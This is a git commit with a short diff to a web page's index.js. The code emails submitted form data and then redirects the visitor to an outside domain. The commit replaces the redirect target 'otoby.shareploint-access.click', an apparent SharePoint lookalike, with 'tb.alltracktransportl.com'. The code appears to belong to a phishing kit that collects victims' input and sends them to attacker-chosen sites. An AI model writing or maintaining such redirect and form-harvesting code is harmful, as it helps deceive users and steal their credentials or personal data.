0be922dc7c5e750fdb41d43bb3f7e023ba016530
husknet <127146284+husknet@users.noreply.github.com>
2024-10-22 10:13:03 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://otoby.shareploint-access.click';
+        window.location.href = 'https://tb.alltracktransportl.com';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
